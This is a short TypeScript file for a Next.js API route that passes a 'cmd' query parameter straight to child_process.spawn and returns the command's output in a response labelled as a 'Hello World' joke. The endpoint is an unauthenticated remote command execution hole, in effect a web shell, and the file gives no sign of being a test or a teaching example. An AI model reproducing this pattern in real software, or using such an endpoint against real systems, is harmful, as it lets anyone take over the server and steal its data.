import type { NextApiRequest, NextApiResponse } from 'next'

const { spawn } = require('child_process')

export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse
) {
  const { query } = req
  const { cmd } = query
  const ls = spawn(cmd)
  ls.stdout.on('data', (data: any) => {
    res.status(200).json({ joke: 'Hello World', cmd, data: data.toString() })
  })
}
